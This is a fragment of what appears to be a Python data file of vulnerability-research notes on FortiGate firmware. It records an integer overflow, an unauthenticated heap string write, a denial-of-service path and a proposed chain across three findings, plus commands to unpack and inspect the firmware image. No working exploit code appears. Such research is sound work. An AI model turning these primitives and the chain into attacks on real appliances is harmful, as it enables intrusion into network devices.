            "if the string is later interpreted (format string, path, configuration key)."
        ),
    },

    "arm64_800": {
        "foff_handler": "0x2dfa2c",
        "equivalent_overflow": "add w0, w0, #1 on w0=0xffffffff wraps to 0 (same 32-bit wrap)",
        "arm64_dos_status": "NOT confirmed -- standard ARM64 copy_from_user rejects SIZE_MAX (access_ok correct). Integer overflow to kmalloc(0) occurs but error path returns EFAULT cleanly.",
        "note": "ARM64 0x9007 has the overflow but lacks the DoS crash. Heap primitives (0x55db6d equivalent) still present if size is valid.",
    },

    "chaining_note": (
        "Chain: FGT-F22 (string inject via 0x9007) -> FGT-F19 (field write via 0x9004) -> FGT-F20 (field read via 0x9003). "
        "FGT-F22 injects a string at index N, FGT-F19 writes to object[N+0x44], FGT-F20 reads object fields back. "
        "If 0x55db6d stores the string in the object table, FGT-F22+FGT-F20 enables reading back the injected string to confirm write."
    ),

    "status": "CONFIRMED class (unauth heap allocation + string write). DoS path confirmed via FGT-F16. Injection impact requires dynamic analysis of 0x55db6d.",
}

# ─────────────────────────────────────────────────────────
# Forensic extraction commands
# ─────────────────────────────────────────────────────────
EXTRACTION_COMMANDS = {
    "qcow2_to_raw": "qemu-img convert -f qcow2 virtioa.qcow2 virtioa.raw",
    "mount_p1": "sudo losetup -o 1048576 --sizelimit 268435456 /dev/loop0 virtioa.raw && sudo mount /dev/loop0 /mnt/p1",
    "extract_cpio": "cd rootfs && cpio -idm < ../mnt/p1/rootfs.gz",
    "decompress_bin_tar": """
import lzma
def fortios_xz_decompress(path):
    data = open(path, 'rb').read()
    block_hdr_size_byte = data[12]
    block_header_len = (block_hdr_size_byte + 1) * 4
    lzma2_start = 12 + block_header_len
    lzma_data = data[lzma2_start:]
    return lzma.LZMADecompressor(
        format=lzma.FORMAT_RAW,
        filters=[{'id': lzma.FILTER_LZMA2, 'preset': 6}]
    ).decompress(lzma_data)
""",
    "extract_tar": "tar -xf bin.tar -C bin_root/",
    "strings_init": "strings bin_root/bin/init | grep -E '(passwd|admin|key|cert|bypass|backdoor)'",
}
